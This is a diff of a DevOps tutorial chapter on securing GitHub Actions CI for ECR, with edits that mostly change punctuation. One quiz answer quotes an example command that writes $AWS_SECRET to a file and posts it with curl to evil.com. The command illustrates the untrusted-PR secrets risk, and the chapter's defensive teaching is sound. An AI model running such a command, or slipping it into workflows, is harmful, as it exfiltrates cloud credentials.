@@ -15,11 +15,11 @@
 > multi-environment, multi-team CI safe at the platform level.
 
 **Estimated time:** ~30 min read · ~90 min hands-on
-**Prerequisites:** [Part 07 ch.03](../07-delivery/03-cicd-pipeline.md) —
+**Prerequisites:** [Part 07 ch.03](../07-delivery/03-cicd-pipeline.md):
 generic CI you'll now deepen for multi-service ECR · [Part 15
-ch.01](./01-pr-to-production-lifecycle.md) — loop stages that frame the
+ch.01](./01-pr-to-production-lifecycle.md): loop stages that frame the
 pipeline · [Part 14
-ch.07](../14-eks-in-production-a-to-z/07-infrastructure-cicd-and-drift.md) —
+ch.07](../14-eks-in-production-a-to-z/07-infrastructure-cicd-and-drift.md):
 sibling infra CI/CD via OIDC
 
 **You'll know after this:** • author a GitHub Actions workflow with build → test → scan → multi-arch image push to ECR in real stage order · • configure GitHub Actions OIDC trust for ECR push (no static AWS keys, ever) · • design build caching for Go modules + Docker buildx GHA cache to keep CI short · • defeat the "CI ate my repo" footgun (untrusted-PR-with-secrets) with `pull_request_target` discipline · • configure branch protection + required checks that map to environment promotion gates
@@ -70,7 +70,7 @@ The chapter also names the **two pipeline-shaped security failures** Part
   `if: github.event_name == 'push'` convenience, the
   `pull_request_target` *non*-pattern).
 
-- **Mutable action versions** — a workflow that uses `@v3` runs whatever that
+- **Mutable action versions**: a workflow that uses `@v3` runs whatever that
   tag points at on its next run. This chapter pins every third-party action to
   a commit SHA, with the release in a comment, and explains why under How it
   works.
@@ -298,10 +298,10 @@ job 2 runs. The
 test's *own* package, which under-reports for a service with cross-
 package tests. Uploads `coverage.out` as an artifact. **No cloud
 credentials, no registry access.** This job runs on **every** PR and
-**every** push — the fail-fast gate. Permissions are `contents: read`. The
+**every** push: the fail-fast gate. Permissions are `contents: read`. The
 catalog source it builds is in this guide's examples tree.
 
-**Job 2 — `integration-test`** (`needs: lint-test`). Runs
+**Job 2: `integration-test`** (`needs: lint-test`). Runs
 `TestPostgresRepo_Contract`. The test starts Postgres 16 with testcontainers,
 the repository applies the catalog's migration when it starts, and the
 contract runs against that database. The job needs Docker on the runner,
@@ -376,7 +376,7 @@ reaches this job. On a merged-to-`main` push:
    — a Kyverno `verifyImages` rule can match exactly that). The cert +
    signature + a Rekor entry are stored; **no long-lived signing key is
    stored**.
-9. `cosign attest --type cyclonedx --predicate <SBOM> <IMAGE>@<DIGEST>` —
+9. `cosign attest --type cyclonedx --predicate <SBOM> <IMAGE>@<DIGEST>`:
    the SBOM is bound to the digest as a cosign attestation, so a
    consumer can `cosign verify-attestation` and trust the SBOM via the
    signature chain.
@@ -394,7 +394,7 @@ reaches this job. On a merged-to-`main` push:
 `needs: build-sign-push`, the same `if:` and the same `bookstore-publish`
 environment, because the GitOps token lives there). The CI/CD seam.
 
-1. `actions/checkout` with `repository: ${{ vars.GITOPS_REPO }}` —
+1. `actions/checkout` with `repository: ${{ vars.GITOPS_REPO }}`:
    checks out the **GitOps repo**, not the app repo. `token:
    ${{ secrets.GITOPS_PR_TOKEN }}` (a fine-grained PAT or GitHub App
    token scoped to `contents: write` + `pull-requests: write` on the
@@ -428,7 +428,7 @@ environment, because the GitOps token lives there). The CI/CD seam.
    run ([07.03](../07-delivery/03-cicd-pipeline.md) shows it, and GitHub's
    [token documentation](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)
    gives the rule). **No auto-merge
-   enabled here** — that is a branch-protection
+   enabled here**. That is a branch-protection
    *rule* in the GitOps repo, not a workflow choice. The dev overlay PR
    may auto-merge if branch protection allows; staging/prod overlay PRs
    require human review ([15.04](04-multi-environment-promotion.md)).
@@ -538,7 +538,7 @@ makes the safe pattern *enforceable at admission* via Kyverno
 
 - **The buildx cache and the Go cache are different things.** The Go
   cache (module + build cache) is keyed by `go.sum` via
-  `actions/setup-go`'s `cache: true` — a cache *hit* skips
+  `actions/setup-go`'s `cache: true`. A cache *hit* skips
   `go mod download` and reuses compiled packages (saves 30s+ per run).
   The Buildx cache (`cache-from: type=gha`) is keyed by job-scope
   (`scope: catalog`) and reuses Docker *layers* across runs — a cache
@@ -763,7 +763,7 @@ Checklist:
    <details><summary>Show answer</summary>
 
    An untrusted PR (from a fork or external contributor) runs a workflow that
-   has access to secrets — a single `echo $AWS_SECRET > /tmp/x; curl evil.com
+   has access to secrets: a single `echo $AWS_SECRET > /tmp/x; curl evil.com
    -d @/tmp/x` step exfiltrates everything the workflow can see. Three
    defences: (1) the `bookstore-publish` environment on the privileged jobs
    (sign, push, GitOps PR), with a reviewer and main-only deployments, so their
@@ -771,7 +771,7 @@ Checklist:
    convenience); fork PRs run lint/test/scan only; (2) workflow-level `permissions:` minimal
    (`id-token: write` only when needed, default `contents: read`); (3)
    **don't** use `pull_request_target` against fork code unless the workflow
-   is hardened — that trigger runs in the base repo's context with secrets,
+   is hardened. That trigger runs in the base repo's context with secrets,
    which is the exact attack surface. The combination of these three is what
    makes the workflow safe to expose to public-fork PRs.
 
@@ -781,10 +781,10 @@ Checklist:
    services rather than one cluster-wide threshold?**
    <details><summary>Show answer</summary>
 
-   Risk is asymmetric. payments-worker handles money — a bug is unrecoverable,
+   Risk is asymmetric. payments-worker handles money: a bug is unrecoverable,
    so 80% coverage on every PR including informational ones is right. orders
-   writes data — 70% on `main` only is right; PRs are advisory. catalog is
-   read-only — no coverage gate, just the race detector. Cargo-culting one
+   writes data: 70% on `main` only is right; PRs are advisory. catalog is
+   read-only: no coverage gate, just the race detector. Cargo-culting one
    threshold (say "80% across the board") trains developers to ignore it: the
    catalog team adds noise tests to hit the number, the payments team feels
    the bar is too low, nobody trusts the metric. The chapter's discipline:
@@ -806,18 +806,18 @@ Checklist:
 
    </details>
 
-4. **Hands-on extension — open a fork PR against the bookstore-platform CI
+4. **Hands-on extension: open a fork PR against the bookstore-platform CI
    workflow. What runs, what doesn't, and what does the run log show?**
    <details><summary>What you should see</summary>
 
-   The lint, test, integration-test, and scan jobs run — they don't need
+   The lint, test, integration-test, and scan jobs run. They don't need
    secrets, they need only the public source code. The build-sign-push and
    update-gitops-pr jobs **skip** because of the `if: github.event_name ==
    'push' && github.ref == 'refs/heads/main'` guard; the run log shows them
    with a "skipped" status and a condition that didn't match. Critically, ECR
    push permissions and the GitOps repo PAT are never used in the fork's run
    because the jobs that would use them never executed. This is the chapter's
-   structural defence in action — fork contributors can pass tests and submit
+   structural defence in action. Fork contributors can pass tests and submit
    PRs without holding any credential the workflow has.
 
    </details>
